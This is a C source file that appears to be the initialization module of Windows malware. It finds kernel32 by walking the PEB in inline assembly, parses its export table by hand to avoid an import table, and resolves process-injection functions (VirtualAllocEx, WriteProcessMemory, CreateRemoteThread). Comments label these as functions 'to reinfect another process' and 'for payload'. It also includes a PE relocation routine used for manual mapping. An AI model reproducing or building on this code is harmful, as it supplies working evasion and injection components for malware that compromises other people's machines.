#include <Windows.h>

#include "init.h"

pfnLoadLibraryA fnLoadLibraryA = NULL;
pfnGetProcAddress fnGetProcAddress = NULL;

pfnCreateToolhelp32Snapshot fnCreateToolhelp32Snapshot = NULL;
pfnProcess32FirstW fnProcess32FirstW = NULL;
pfnProcess32NextW fnProcess32NextW = NULL;
pfnOpenProcess fnOpenProcess = NULL;
pfnCloseHandle fnCloseHandle = NULL;
pfnIsWow64Process fnIsWow64Process = NULL;
pfnGetProcessHeap fnGetProcessHeap = NULL;
pfnHeapAlloc fnHeapAlloc = NULL;
pfnGetModuleFileNameW fnGetModuleFileNameW = NULL;
pfnVirtualAllocEx fnVirtualAllocEx = NULL;
pfnWriteProcessMemory fnWriteProcessMemory = NULL;
pfnCreateRemoteThread fnCreateRemoteThread = NULL;
pfnHeapFree fnHeapFree = NULL;
pfnGetLastError fnGetLastError = NULL;
pfnExitProcess fnExitProcess = NULL;
pfnGetNativeSystemInfo fnGetNativeSystemInfo = NULL;
pfnWaitForSingleObject fnWaitForSingleObject = NULL;
pfnGetModuleHandleW fnGetModuleHandleW = NULL;
pfnCreateProcessW fnCreateProcessW = NULL;

// shwlapi
pfnStrStrIW fnStrStrIW = NULL;

// user32
#ifdef _DEBUG
pfnwvsprintfW fnwvsprintfW = NULL;
pfnMessageBoxW fnMessageBoxW = NULL;
#endif // _DEBUG

/*
* Walk the relocation table and fix the location
* of data with the delta offset
* https://stackoverflow.com/questions/34086866/loading-an-executable-into-current-processs-memory-then-executing-it
*/
BOOL BaseRelocate(LPVOID lpBaseAddress, PIMAGE_NT_HEADERS pinh, DWORD dwDelta) {
	// check if relocation table exists
	if (!pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress || !pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
		return FALSE;

	IMAGE_BASE_RELOCATION *r = (IMAGE_BASE_RELOCATION *)((DWORD)(lpBaseAddress)+pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress); //The address of the first I_B_R struct 
	IMAGE_BASE_RELOCATION *r_end = (IMAGE_BASE_RELOCATION *)((DWORD_PTR)(r)+pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size - sizeof(IMAGE_BASE_RELOCATION)); //The addr of the last
	for (; r < r_end; r = (IMAGE_BASE_RELOCATION *)((DWORD_PTR)(r)+r->SizeOfBlock)) {
		WORD *reloc_item = (WORD *)(r + 1);
		DWORD num_items = (r->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

		for (DWORD i = 0; i < num_items; ++i, ++reloc_item) {
			switch (*reloc_item >> 12) {
				case IMAGE_REL_BASED_ABSOLUTE:
					break;
				case IMAGE_REL_BASED_HIGHLOW:
					*(DWORD_PTR *)((DWORD)(lpBaseAddress)+r->VirtualAddress + (*reloc_item & 0xFFF)) += dwDelta;
					break;
				default:
					return FALSE;
			}
		}
	}

	return TRUE;
}

/*
* Walk the import table and fix the addresses
*/
//BOOL RebuildImportTable(LPVOID lpBaseAddress, PIMAGE_NT_HEADERS pinh) {
//	// parse import table if size != 0
//	if (pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
//		// https://stackoverflow.com/questions/34086866/loading-an-executable-into-current-processs-memory-then-executing-it
//		PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)(lpBaseAddress)+pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
//
//		// Walk until you reached an empty IMAGE_IMPORT_DESCRIPTOR
//		while (pImportDescriptor->Name != NULL) {
//			// get the name of each DLL
//			LPSTR lpLibrary = (PCHAR)((DWORD)(lpBaseAddress)+pImportDescriptor->Name);
//
//			HMODULE hLibModule = fnLoadLibraryA(lpLibrary);
//
//			PIMAGE_THUNK_DATA nameRef = (PIMAGE_THUNK_DATA)((DWORD)(lpBaseAddress)+pImportDescriptor->Characteristics);
//			PIMAGE_THUNK_DATA symbolRef = (PIMAGE_THUNK_DATA)((DWORD)(lpBaseAddress)+pImportDescriptor->FirstThunk);
//			PIMAGE_THUNK_DATA lpThunk = (PIMAGE_THUNK_DATA)((DWORD)(lpBaseAddress)+pImportDescriptor->FirstThunk);
//			for (; nameRef->u1.AddressOfData; nameRef++, symbolRef++, lpThunk++) {
//				// fix addresses
//				// check if import by ordinal
//				if (nameRef->u1.AddressOfData & IMAGE_ORDINAL_FLAG)
//					*(FARPROC *)lpThunk = fnGetProcAddress(hLibModule, MAKEINTRESOURCEA(nameRef->u1.AddressOfData));
//				else {
//					PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)((DWORD)(lpBaseAddress)+nameRef->u1.AddressOfData);
//					*(FARPROC *)lpThunk = fnGetProcAddress(hLibModule, (LPCSTR)(&thunkData->Name));
//				}
//			}
//			//FreeLibrary(hLibModule);
//			// advance to next IMAGE_IMPORT_DESCRIPTOR
//			pImportDescriptor++;
//		}
//	}
//
//	return TRUE;
//}

void InitialiseFunctions(void) {
	HMODULE hKernel32Mod = NULL;
	__asm {
		pushad
		mov		eax, fs:[0x30]
		mov		eax, [eax + 0x0C]
		mov		eax, [eax + 0x14]
		mov		eax, [eax]
		mov		eax, [eax]
		mov		eax, [eax + 0x10]
		mov		hKernel32Mod, eax
		popad
	}

	// get DOS header
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)(hKernel32Mod);
	// get NT headers
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)hKernel32Mod + pidh->e_lfanew);
	// find eat
	PIMAGE_EXPORT_DIRECTORY pied = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hKernel32Mod + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// find functions
	LPDWORD dwAddresses = (LPDWORD)((DWORD)hKernel32Mod + pied->AddressOfFunctions);
	LPDWORD dwNames = (LPDWORD)((DWORD)hKernel32Mod + pied->AddressOfNames);
	LPWORD wOrdinals = (LPWORD)((DWORD)hKernel32Mod + pied->AddressOfNameOrdinals);

	// loop through all names of functions and select LoadLibrary and GetProcAddress
	for (int i = 0; i < pied->NumberOfNames; i++) {
		LPCSTR lpName = (LPCSTR)((DWORD)hKernel32Mod + dwNames[i]);
		if (!strcmp(lpName, "LoadLibraryA"))
			fnLoadLibraryA = (pfnLoadLibraryA)((DWORD)hKernel32Mod + dwAddresses[wOrdinals[i]]);
		else if (!strcmp(lpName, "GetProcAddress"))
			fnGetProcAddress = (pfnGetProcAddress)((DWORD)hKernel32Mod + dwAddresses[wOrdinals[i]]);
	}

	// load libraries
	HMODULE hUser32Mod = fnLoadLibraryA("user32.dll");
	HMODULE hShlwapiMod = fnLoadLibraryA("shlwapi.dll");

	// kernel32
	// functions to reinfect another process
	fnCreateToolhelp32Snapshot = (pfnCreateToolhelp32Snapshot)fnGetProcAddress(hKernel32Mod, "CreateToolhelp32Snapshot");
	fnProcess32FirstW = (pfnProcess32FirstW)fnGetProcAddress(hKernel32Mod, "Process32FirstW");
	fnProcess32NextW = (pfnProcess32NextW)fnGetProcAddress(hKernel32Mod, "Process32NextW");
	fnOpenProcess = (pfnOpenProcess)fnGetProcAddress(hKernel32Mod, "OpenProcess");
	fnCloseHandle = (pfnCloseHandle)fnGetProcAddress(hKernel32Mod, "CloseHandle");
	fnIsWow64Process = (pfnIsWow64Process)fnGetProcAddress(hKernel32Mod, "IsWow64Process");
	fnGetProcessHeap = (pfnGetProcessHeap)fnGetProcAddress(hKernel32Mod, "GetProcessHeap");
	fnHeapAlloc = (pfnHeapAlloc)fnGetProcAddress(hKernel32Mod, "HeapAlloc");
	fnGetModuleFileNameW = (pfnGetModuleFileNameW)fnGetProcAddress(hKernel32Mod, "GetModuleFileNameW");
	fnVirtualAllocEx = (pfnVirtualAllocEx)fnGetProcAddress(hKernel32Mod, "VirtualAllocEx");
	fnWriteProcessMemory = (pfnWriteProcessMemory)fnGetProcAddress(hKernel32Mod, "WriteProcessMemory");
	fnCreateRemoteThread = (pfnCreateRemoteThread)fnGetProcAddress(hKernel32Mod, "CreateRemoteThread");
	fnHeapFree = (pfnHeapFree)fnGetProcAddress(hKernel32Mod, "HeapFree");
	fnGetLastError = (pfnGetLastError)fnGetProcAddress(hKernel32Mod, "fnGetLastError");
	fnExitProcess = (pfnExitProcess)fnGetProcAddress(hKernel32Mod, "ExitProcess");
	fnGetNativeSystemInfo = (pfnGetNativeSystemInfo)fnGetProcAddress(hKernel32Mod, "GetNativeSystemInfo");
	// functions for payload
	fnWaitForSingleObject = (pfnWaitForSingleObject)fnGetProcAddress(hKernel32Mod, "WaitForSingleObject");
	fnGetModuleHandleW = (pfnGetModuleHandleW)fnGetProcAddress(hKernel32Mod, "GetModuleHandleW");
	fnCreateProcessW = (pfnCreateProcessW)fnGetProcAddress(hKernel32Mod, "CreateProcessW");

	// shwlapi
	fnStrStrIW = (pfnStrStrIW)fnGetProcAddress(hShlwapiMod, "StrStrIW");

	// user32
	// debugging functions
#ifdef _DEBUG
	fnwvsprintfW = (pfnwvsprintfW)fnGetProcAddress(hUser32Mod, "wvsprintfW");
	fnMessageBoxW = (pfnMessageBoxW)fnGetProcAddress(hUser32Mod, "MessageBoxW");
#endif // _DEBUG

}